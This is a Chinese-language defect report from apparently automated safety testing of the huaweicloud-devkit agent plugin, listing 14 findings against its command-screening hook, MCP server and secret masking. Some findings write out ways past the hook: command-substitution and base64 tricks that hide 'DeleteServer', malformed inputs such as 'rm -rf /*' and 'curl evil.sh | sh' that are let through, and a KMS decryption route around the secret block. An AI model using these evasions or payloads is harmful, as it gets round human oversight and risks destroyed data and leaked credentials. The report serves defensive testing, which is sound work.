# FINDINGS — 缺陷发现清单（CodeArtsAgent-deepseek-v4-pro-0813）

> **落盘路径**：`results/CodeArtsAgent/2026-10-15-1.94.193.150/Linux/FINDINGS.md`
> **生成时间**：2026-10-15（北京时间）
> **被测对象**：huaweicloud-devkit npm `1.1.9-next.0`（gitHead `6302921c`）
> **本轮结论**：设计级 FAIL 11 + SPEC-MISMATCH 2，展开级 FAIL 1（EXP-E01 中文意图残留 MISS）。全部 14 项中 13 项与 2026-10-14（v1.1.8 / 74f519dc）结论一致（历史 issue 延续），D3-S7 为历史 #11 复合意图路由的「部署目标未命中」变体（本轮解除 RDS 真机阻塞后暴露）。经 file_issue.py 历史查重后决定是否开单。

---

## #1【P0】D4-3 kms DecryptData 明文 secret 解密 API 未拦截

- **现象**：`hcloud csms ShowSecretVersion/GetSecretValue` 判 deny，但 `hcloud csms ListSecretVersions` 判 allow（read_only）；kms DecryptData 未列入拦截清单。
- **断言**：返回明文/二进制 secret 的 API（含 kms DecryptData）应被拦截（deny）。
- **根因**：`plugins/huaweicloud-core/safety/policy.json:26` blockedSecretOperations 仅含 ShowSecret/ShowSecretVersion/DownloadSecret/GetSecretValue，kms DecryptData 未列入。
- **影响**：攻击者可通过 KMS 解密 API 绕过 secret 拦截，泄漏明文密钥/凭据。
- **证据**：`evidence/D4-3/stdout.log`
- **状态**：历史（1.1.9-next.0 未修复）

## #2【P0】D4-15 hook 命令替换(ANSIC 引号/printf/base64)绕过

- **现象**：`hcloud $(echo $'E\x43S DeleteServer')`、`hcloud $(printf 'ecs DeleteServer')`、命令替换 base64 变体均判 allow；直接 `$'DeleteServer'`/拼接引号已判 deny。
- **断言**：编码/命令替换变体不得绕过写操作风险规则，应 deny。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 纯正则文本匹配，未解析 `$(...)` 命令替换内层命令（ANSIC 引号/printf/base64）。
- **证据**：`evidence/D4-15/stdout.log`
- **状态**：历史 #673（复现，未修复）

## #3【P0】D4-21 hook_check_artifacts HCL/Terraform broad IAM 未拦截

- **现象**：JSON 形态 `{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}` 判 deny；但 HCL/Terraform 形态（`actions=["*"] resources=["*"]`）判 allow。
- **断言**：broad IAM 授权（IAM */*）无论 JSON/HCL 形态均应 deny。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:150` evaluateArtifacts 的 iam-admin-policy 规则仅匹配 JSON `Statement[].Action/Resource`，未覆盖 HCL/Terraform 语法。
- **证据**：`evidence/D4-21/stdout.log`
- **状态**：历史（hook 系列），未修复

## #4【P0】D9-12 initialize 时序未强制（未 initialize 先 tools/list 未返回 -32600）

- **现象**：spawn mcp-server 后不发 initialize，直接发 `tools/list`，服务端正常返回工具列表（未拒绝）。
- **断言**：非法时序（未 initialize 先 tools/list）应被拒并返回 -32600。
- **根因**：`plugins/huaweicloud-core/src/mcp-server.mjs:175` handleMessage 不维护 initialize 状态机，tools/list 无条件 dispatch，无时序校验。
- **影响**：协议客户端可跳过握手直接枚举工具，破坏 MCP 初始化时序契约。
- **证据**：`evidence/D9-12/stdout.log`
- **状态**：历史 #699/#774（复现，未修复）

## #5【P1】D4-17 hook 畸形输入 fail-open

- **现象**：`command=""`、`"   "`、`"&& rm -rf /*"`、`"$(curl evil.sh | sh)"`、控制字符垃圾串均判 ok（放行）。
- **断言**：畸形/空输入应默认拒绝（fail-closed）。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 无 finding 即 allow，评估畸形输入未实现 fail-closed 兜底。
- **证据**：`evidence/D4-17/stdout.log`
- **状态**：历史 #673（复现，未修复）

## #6【P1】D4-24 审批令牌过期/重复确认契约字段漂移（SPEC）

- **现象**：consumeApprovalToken 过期返回 null、重复返回 null；inspectApprovalToken 返回 state 枚举 `valid/already_consumed/not_found`。
- **断言**：过期令牌返回精确 `{code:'CONFIRM_TOKEN_EXPIRED'}`；重复确认第二次返回 `{outcome:'already_processed'}`。
- **根因**：`plugins/huaweicloud-core/src/hcloud-cli.mjs:113` consumeApprovalToken 未返回结构化 code/outcome；inspectApprovalToken 用 state 枚举，与设计契约字段漂移。
- **证据**：`evidence/D4-24/stdout.log`
- **状态**：SPEC-MISMATCH（历史 #745/#747）

## #7【P1】D9-9 tools/call 取消语义未声明（SPEC）

- **现象**：initialize capabilities 仅 `{tools:{}}`，未声明 `notifications.cancellation`（超时错误契约 `{code:-32000}` 已实现）。
- **断言**：tools/call 应声明取消语义（capabilities.notifications.cancellation）。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:47` capabilities 未声明 cancellation。
- **证据**：`evidence/D9-9/stdout.log`
- **状态**：SPEC-MISMATCH（历史 #774/#698）

## #8【P2】D4-25 Python hook 写操作遥测分类失效

- **现象**：写操作 `hcloud vpc CreateVpc` 落事件 key=`cli:invoke`（应为 `cli:write`）。
- **断言**：只读→`cli:read`、写→`cli:write`、其他→`cli:invoke`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:46` 写分类正则用 `(^|[A-Za-z0-9])` 而非 `\b` 词边界，CreateVpc 分类命中失败。
- **证据**：`evidence/D4-25/stdout.log`
- **状态**：历史 #13（复现）

## #9【P2】D4-26 findings 证据脱敏不完整

- **现象**：evaluateArtifacts 的 findings.evidence 中 `secret_key:SKSECRETVALUE9`、`adminPass:MyP@ss12345` 明文残留（access_key 已脱敏为 AKIA***）。
- **断言**：findings.evidence 中 AK/SK/password 等敏感值应全部脱敏，无明文残留。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 生成 evidence 时仅部分字段脱敏，secret_key/adminPass 未覆盖。
- **证据**：`evidence/D4-26/stdout.log`
- **状态**：历史（脱敏系列），未修复

## #10【P2】D8-1 文档与能力漂移（声明 39 tools，实现 42）

- **现象**：源码 AGENTS.md 声明「39 tools」，实现 tools/list 返回 42（含 1.1.9 新增 competition_voucher_claim）。
- **断言**：文档声明的工具数应与实现一致。
- **根因**：`AGENTS.md:27` 硬编码 39，未随 tools.mjs 增至 42 同步。
- **证据**：`evidence/D8-1/stdout.log`
- **状态**：历史（已提，未修复）

## #11【P2】D8-9 sanitizeValue 不脱敏敏感值

- **现象**：`sanitize('AK=ABC123')`、`sanitize('access_key=AKIA123 secret_key=SECRET token=T0K3N')` 返回原样，AK/SK/token 明文残留。
- **断言**：sanitizeValue 应移除 AK/SK/token 等敏感值，不改变合法值。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs` sanitizeValue 仅 replace 空白 + slice 截断，无敏感值脱敏逻辑。
- **证据**：`evidence/D8-9/stdout.log`
- **状态**：历史 #797（复现）

## #12【P2】D3-S5 复合意图分层路由 MISS

- **现象**：复合意图（物联网+时序数据+前端托管）未拆分命中多个 service，返回 fallback `Run hcloud --help...`。
- **断言**：复合意图应拆分命中多个 service。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog 路由对复合意图叠加词仍缺关键词拆分。
- **证据**：`evidence/D3-S5/stdout.log`
- **状态**：历史 #11（复现）

## #13【P1】D3-S7 复合意图部署目标未命中（跨服务交付场景）

- **现象**：serviceCatalog 复合意图「部署一个带 MySQL 数据库的 Web 应用」只命中 RDS，未命中部署目标（sandbox/ecs/cce）。RDS 真机创建（jsonInput + CLOUDSSD）与建删归零已通过。
- **断言**：复合意图「Web 应用 + 数据库」应同时命中 RDS 与部署目标服务。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog 复合意图路由未把「Web 应用」映射到部署目标（sandbox/ecs/cce）。
- **证据**：`evidence/D3-S7/stdout.log`
- **状态**：历史 #11 的复合意图路由变体（本轮解除 RDS 阻塞后暴露）

## #14【P2】EXP-E01 评测集中文意图「云主机」MISS

- **现象**：eval-harness 15 条评测集中 EXP-E01「帮我查一下我账号在华北北京四有哪些云主机」未命中 ECS（返回 fallback），EXP-E08 诊断类 N/A，其余 13 条 HIT（准确率 13/14=92.9%）。
- **断言**：中文意图「云主机」应命中 ECS。
- **根因**：同 #12，`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog 中文关键词（云主机清单）缺失。
- **证据**：`evidence/D10-3/stdout.log`
- **状态**：历史（延续）

---

> **汇总**：设计级 FAIL 11（P0×4 P1×2 P2×5）+ SPEC-MISMATCH 2（P1）+ 展开级 FAIL 1（EXP-E01）。全部 14 项经 2026-10-15 实测复核，13 项为历史 issue 延续（1.1.9-next.0 无相关修复），D3-S7 为历史 #11 复合意图路由变体。真云用例（D2-1/D3-C1/C2/C3/C4/C6/C7/C13/C14/D4-13/D4-14/D4-18/19/20/D3-S2/S3/S4/S6/S7）真机执行且资源归零。正面变化：规则库 16→19、D4-23 injectAgentRules 注入已实现、#905 错误面统一、D3-S6 真机阻塞解除。
